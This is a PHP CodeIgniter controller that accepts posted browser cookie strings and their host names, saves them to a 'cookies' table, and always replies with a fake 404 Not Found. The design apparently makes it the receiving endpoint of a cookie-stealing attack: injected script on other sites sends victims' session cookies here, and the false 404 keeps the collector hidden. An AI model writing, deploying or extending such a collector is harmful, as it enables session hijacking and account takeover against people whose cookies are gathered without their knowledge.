<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Cookie extends CI_Controller {

	function __construct(){
		parent::__construct();
		$this->load->model('m_data');
	}

	public function index(){
		$this->load->library('form_validation');
		if($this->form_validation->run('cookie_report')){
			$data = array(
				'value' => trim($this->input->post('cookie')),
				'host' => trim($this->input->post('host'))
			);
			$this->m_data->insert($data, 'cookies');
		}
		header('HTTP/1.0 404 Not Found', 404, true);
	}

	public function is_cookie($data=null){
		$temp = explode('; ', $data);

		if(!is_array($temp)){
			$temp = explode(';', $data);
		}

		if(is_array($temp)){
			$data = array();
			foreach($temp as $value) {
				$uri = explode('=', $value);
				$data[array_shift($uri)] = implode('', $uri);
			}

			return (count($data) > 0);
		}
		else{
			$this->form_validation->set_message('is_cookie', 'This Coloumns {field} isnt a cookie');
			return false;
		}
	}
}
